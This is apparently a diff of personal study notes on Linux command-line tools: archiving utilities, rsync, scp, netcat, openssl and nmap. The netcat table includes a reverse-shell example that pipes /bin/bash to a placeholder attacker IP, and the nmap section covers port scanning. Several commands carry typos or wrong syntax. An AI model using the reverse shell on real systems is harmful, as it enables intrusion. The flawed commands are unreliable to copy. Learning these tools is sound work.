@@ -1,6 +1,5 @@
 *June 07, 2026*
 
-# RANDOM SHJT FOR NOW
 
 # For unzipping
 
@@ -15,12 +14,13 @@ gunzip filename.gz
 
 >Commands and Flags
 
-| Usage               | Desc                                                                                  |     |
-| :------------------ | ------------------------------------------------------------------------------------- | --- |
-| `gunzip -k file.gz` | Keep the original `.gz` file                                                          |     |
-| `gunzip -l file.gz` | Just view the info(without extracting)<br>`compressed size, uncompressed side, ratio` |     |
-| `gunzip -f file.gz` | Force **Decompress**                                                                  |     |
-| `gunzip -c file.gz` | Shows the content without extracting (just print)                                     |     |
+| Usage               | Desc                                                                                  |                                                                                |
+| :------------------ | ------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |
+| `-d`                | explicitly state to decompress a file                                                 |                                                                                |
+| `gunzip -k file.gz` | Keep the original `.gz` file                                                          |                                                                                |
+| `gunzip -l file.gz` | Just view the info(without extracting)<br>`compressed size, uncompressed side, ratio` |                                                                                |
+| `gunzip -f file.gz` | Force **Decompress**                                                                  |                                                                                |
+| `gunzip -c file.gz` | Shows the content without extracting (just print)                                     | useful when saving the output to another file<br><br>`gzip -c [input] [output] |
 
 ### Usage for Compressing
 ```
@@ -88,12 +88,15 @@ Why?
 *Slower then [[#**Gunzip**]] but compresses smaller.*
 > Similarly — it also compress files and not directories
 
-| Flags | Desc                         |                                                   |
-| :---: | ---------------------------- | ------------------------------------------------- |
-| `-d`  | Use in bzip2<br>`decompress` | `bzip2 -d file`                                   |
-| `-k`  | keeps the `.bz2` file        |                                                   |
-| `-f`  | `Force overwrite`            | Overwrite the exisitng output file without asking |
-| `-v`  | `verbose`                    | Shows compression progress                        |
+| Flags | Desc                             |                                                   |
+| :---: | -------------------------------- | ------------------------------------------------- |
+| `-d`  | Use in bzip2<br>`decompress`     | `bzip2 -d file`                                   |
+| `-z`  | compress                         |                                                   |
+| `-k`  | keeps the `.bz2` file            |                                                   |
+| `-f`  | `Force overwrite`                | Overwrite the exisitng output file without asking |
+| `-v`  | `verbose`                        | Shows compression progress                        |
+| `-c`  | compress or decompress to stdout |                                                   |
+|       |                                  |                                                   |
 
 
 ### Practical Usage
@@ -113,7 +116,7 @@ bzcat file.txt
 
 >**Compression**
 ```bash
-bzip2 file.txt
+bzip2 -z file.txt
 ```
 ## **tar**
 *June 07, 2026*
@@ -306,9 +309,236 @@ Files here usually lose their original names (since the naming info was in the b
 
 # File Transfer Tools
 
-### Rsync
+### **RYSNC**
+*Synchornization tool, not just copying*
+
+>[!Note] Usage
+>```Bash
+>rsync [options] sources destination
+>
+>#example
+>rsync -avz file.txt user@server:/source/  /destination/
+>```
 
 **With SSH**
 ```bash
 rysync -avz --progress -e "ssh -p [portNum]" username@ipaddress:[source] [destinationToLocalMachine] 
 ```
+
+
+>[!Question] **QUESTIONS**
+>**What does it do?**
+>- Compare sources vs destination
+>- Transfer only differences
+>	- meaning first sync is full transfer, the next time sync is only the changes.
+>- Can resume interrupted transfers
+>- Can preserve permissions, timestamps, ownership, etc.
+>
+>**Can it detects changes in slight modification in file and syncs it?**
+>*Yes, it checks metadata, like modification time. It skips the size same, mtime same*
+>
+>**Can it be use for compressed files or dir?**
+>*It does not sync whats inside the compressed file. It treats the compressed file as a single file. Technically, the answer is **yesnt** *
+
+**The difference of sync to Copy**
+
+| Tool  | Behavior           |
+| :---- | ------------------ |
+| `cp`  | Blindly copies     |
+| scp   | secure remote copy |
+| rsync | intelligent sync   |
+
+**Commands**
+
+| Commands                             | Desc                                                                   |                                                                                                                                                                                                                               |
+| :----------------------------------- | ---------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `rsync -av sources/ dest/`           | `a` - archive mode <br>`v` - verbose mode, it displays whats happening | commonly use                                                                                                                                                                                                                  |
+| `-c`                                 | -checksum                                                              |                                                                                                                                                                                                                               |
+| `--delete`                           | delets files in destination that doesnt exist in source                |                                                                                                                                                                                                                               |
+|                                      |                                                                        |                                                                                                                                                                                                                               |
+| ***RSYNC OVER SSH***                 | ***RSYNC OVER SSH***                                                   | ***RSYNC OVER SSH***                                                                                                                                                                                                          |
+| `rsync -av source/ user@ip:/path/`   | copy `source/` to remote machine via ssh                               | The source is client                                                                                                                                                                                                          |
+| `rsync -av user@ip:/path/ localDest` | the source destination is from server. Copy to client machine          | The source is server                                                                                                                                                                                                          |
+|                                      |                                                                        |                                                                                                                                                                                                                               |
+| ***COMMON FLAGS***                   | ***COMMON FLAGS***                                                     | ***COMMON FLAGS***                                                                                                                                                                                                            |
+| `-a`                                 | archive mode.                                                          | the baseline. Its like a bundle of flags<br><br>`-r` recursive<br>`-l` preserve symlinks<br>`-p` preserve permissions<br>`-t` preserve timestamp<br>`-g` preserve group<br>`-o` preserver owner<br>`-D` preserve device files |
+| `-v`                                 | verbose. Shows whats happenig                                          | useful for bebugging<br>useless in automation                                                                                                                                                                                 |
+| `--progress`                         | shows per-file transfer progress                                       | useful for large file<br>slows output slightly                                                                                                                                                                                |
+| `-z`                                 | compression. Compress data during transfer.                            | FOR NETWORK/SSH ONLY<br>useful for slow internet<br>useless for local copy.<br><br>TRADEOFF??<br>save bandwith<br>uses CPU                                                                                                    |
+| `--delete`                           | makes destination mirror the source exactly                            | if file is removed in source. It also removed in dest.                                                                                                                                                                        |
+| `-c`                                 | checksum mode. Compares actual file content(not just metadata)         | very accurate, but super slow.<br>use only when timestamp is unreliable and high integrity is must                                                                                                                            |
+|                                      |                                                                        |                                                                                                                                                                                                                               |
+
+### SCP 
+*June 27, 2028*
+*Secure Copy — used to copy files between machines over SSH*
+
+>Usage and Pattern:  `cp` + `ssh` = `scp`  
+```
+scp [flags] <source> <destination>
+```
+
+>**Copy LOCAL to REMOTE**
+```bash
+scp [flags and options] [the_File] <user>@<remoteIP>:[dest_Path/]
+```
+
+>**Copy REMOTE to LOCAL**
+```bash
+scp [flags and options] <user>@<remoteIP>:[source_Path] [dest_path]
+```
+
+| Flags | Desc                                                                            |                                   |
+| :---- | ------------------------------------------------------------------------------- | --------------------------------- |
+| `-P`  | Specify a port number for the SSH server                                        | `scp -P 2222 [the_File].....`     |
+| `-i`  | Explicitly provide the `identity file`/`private_key` for SSH key authentication | `scp -P 2222 i ~/.ssh/[filename]` |
+| `-r`  | Recurisve — for copying folders and its contents                                | `scp -P 2222 -r`                  |
+| `-v`  | Verbose — for debug transfer                                                    | `scp -P 2222 -rv`                 |
+| `-C`  | Compression — speed up transfer over slow network                               | `scp -P 2222 -Crv`                |
+
+
+---
+---
+
+# Networking 
+
+
+### Netcat (nc)
+*June 27, 2026*
+*The Swiss Army Knife of Networking 
+- a low-level networking tool that can **read and write data across TCP/UDP connections**.*
+- a user-space application that directly uses the OS socket API to create TCP/UDP connections.
+- A CLI interface that wraps [[RANDOM FOR NOW#SOCKETS|socket]] system calls 
+- *Manual connection between two network endpoints using raw data stream*
+
+
+>Think of it as a **network pipe** tool. And because it directly uses socket API:
+>- it connects two machines
+>- **Sends raw data** between them
+>- **Doesnt care** about format (HTTP, files, text, etc.) 
+>	- *Check this out to know what it means: [[How_host_do_speaks_on_the_internet#Layer Placement for Real world]]*
+
+#### How is it used?
+
+>Basic Syntax
+```bash
+nc [options] <host> <destination_port>    #client mode
+nc -l <port>                  #listener mode
+```
+
+#### How it works
+
+>It uses:
+- TCP or UPD sockets
+- Raw byte stream ( no application protocol required)
+>So instead of:
+```
+Browser --> HTTP ---> Remote port
+```
+It uses:
+```
+You --> RAW SOCKET --> Remote port
+```
+
+#### What is it used for?
+
+| Category          | Use Case                                            |                                                                                                  |                                                                                                                                                                                                                                               |
+| :---------------- | --------------------------------------------------- | ------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Debugging         | Test if a port is open, Inspect raw server response | `nc -zv google.com 443`<br><br>`-z` zero I/O scan only<br>`-v` verbose                           |                                                                                                                                                                                                                                               |
+| Port Scanning     | Lightweight scan to check open ports                | `nc -zv <ip> 20-80`<br>form port 20 to port 80                                                   |                                                                                                                                                                                                                                               |
+| Port Listening    | server-side. *Uses the loopback ip as default*      | `nc -l 4444`                                                                                     |                                                                                                                                                                                                                                               |
+| Port Listening    | Explicitly state the server's ip                    | `nc -l <ipadress> <port>`                                                                        |                                                                                                                                                                                                                                               |
+| Banner Grabbing   | Identify what service is running on a port          | `echo "" \| nc -v exmaple.com 80`                                                                |                                                                                                                                                                                                                                               |
+| File Transfer     | Sends files between machines without scp/ftp        | Receiver:  `nc -l 9000 > received_file.tar.gz`<br>Sender:   `nc 192.168.1.10 9000 < file.tar.gz` | TIP: the `>  <` is also use for redirection of text when doing real time chat<br>`nc -lv 4444 > to_this_file`  <br>`nc <ip> <port> > to this file`<br><br>now both text for client and server are redirected to their respective file choice. |
+| Chat              | Primitive real-time chata over a LAN                | Machine A:  `nc -l 5000`<br>Machine B: `nc 192.168.1.10 5000`                                    |                                                                                                                                                                                                                                               |
+| Proxying          | Real traffic between hosts                          |                                                                                                  |                                                                                                                                                                                                                                               |
+| Shell Access      | Bind or Reverse shell (used heavily in pentesting)  | Attacker:  `nc -l -p 4444`<br>Victim:  `<attackerIP> 4444 -e /bin/bash`                          |                                                                                                                                                                                                                                               |
+| Server Simulation | Stand up quikc listener to test client behavior     |                                                                                                  |                                                                                                                                                                                                                                               |
+>[!Important] Firewall
+>Dont forget to enable the port that will be used to listen. Or else, clients may not get through.
+
+> Common flags
+
+| Flags | Desc                                        |                                           |
+| :---- | ------------------------------------------- | ----------------------------------------- |
+| `-l`  | listen mode                                 |                                           |
+| `-p`  | state the port to use as a client           | `local source port` — where you send from |
+| `-v`  | verbose                                     |                                           |
+| `-z`  | Scan mode ( no data sent)                   |                                           |
+| `-u`  | UDP mode                                    |                                           |
+| `-e`  | execute program (dangerous, often disabled) |                                           |
+| `-k`  | keeo the connection active                  | (used together with `-l` flag)            |
+
+
+### openssl
+---
+July 03, 2026
+*A cryptography toolkit that implements the protocol of SSL(Secure Socket Layer) and TLS(Transport Layer Secure)
+
+>**Practical usage list** 
+- Encryption and decryption
+- Generating hashes
+- Creating SSL/TLS certificates
+- Creating public/private keys
+- Inspecting certificates
+- Testing TLS connections
+- Generating random numbers
+
+>**It is used everywhere:**
+- HTTPS websites
+- SSH (indirectly, for key formats and cryptography)
+- VPNs
+- Email encryption
+- Web servers
+- Certificate Authorities
+
+#### Most useful subcommands
+
+| Subcommand | Purpose                                            |                                                                                                                                |                                                                     |
+| :--------: | -------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------- |
+| `version`  | Show the ver                                       | `openssl version`                                                                                                              |                                                                     |
+|   `rand`   | Generate random bytes                              | `openssl rand 16`<br>`openssl rand -hex 16`<br>                                                                                | *for API keys, passwd, tokens, salts*                               |
+|   `dgst`   | Create hashes/checksum                             | `openssl dgst -sha256 [file]`                                                                                                  |                                                                     |
+|   `enc`    | Encrypt or decryp files<br><br><br>To decrypt:     | `openssl enc -aes-256-cbc -in secrete.txt -out secret.enc`<br><br>`openssl enc -d -aes-256-cbc -in secret.enc -out secret.txt` |                                                                     |
+| `genrsasa` | Generate RSA Private key <br>*`genpykey` is newer* |                                                                                                                                |                                                                     |
+| `genpkey`  | Generate private keys                              | `openssl genpkey -algorithm RSA -out private.pem`                                                                              |                                                                     |
+|   `rsa`    | Inspect RSA Keys                                   |                                                                                                                                |                                                                     |
+|   `req`    | Create Certificate Signing Request (CSR)           |                                                                                                                                |                                                                     |
+|   `x509`   | Work with certificate                              | `openssl x509 -in certificate.crt -text -noout`                                                                                | Shows:<br><br>- issuer<br>- subject<br>- expiration<br>- public key |
+| `s_client` | Test SSL/TLS connection                            | `openssl s_client -connect example.com:443`                                                                                    |                                                                     |
+|            |                                                    |                                                                                                                                |                                                                     |
+
+### nmap
+July 03, 2026
+*Network Mapper* - A network scanner
+Part of `Reconnaisance` Tool
+
+>**It can discover**:
+- Hosts on a network
+- Open ports
+- Running services
+- Operating systems (best effort)
+- Software versions
+- Firewall behavior
+- Network topology (to some extent)
+
+#### Usage
+```bash
+namp [options] target
+```
+
+| Practical use                       | Command                                                |               |     |
+| :---------------------------------- | ------------------------------------------------------ | ------------- | --- |
+| Basic scan                          | `nmap [ipaddress/hostName]`                            |               |     |
+| Scan entire subnet                  | `nmap [ip/24]`                                         |               |     |
+| Check  port                         | `nmap -p 80 [target]`<br>`nmap -p 80-100 [target]`<br> |               |     |
+| Check for what services are running | `nmap -sV [target]`                                    |               |     |
+| Guess the operating System          | `nmap -O [target]`                                     | Requires root |     |
+
+|  Common Scan Types  | Commands |                              |
+| :-----------------: | -------- | ---------------------------- |
+| Host discovery only | `-sn`    |                              |
+| SYN(Half-open)scan  | `-sS`    | Refer to [[3-WAY_HANDSHAKE]] |
+|  TCP Connect Scan   | `-sT`    |                              |
+|      UDP Scan       | `-sU`    |                              |
+|   Aggressive Scan   | `-A`     |                              |
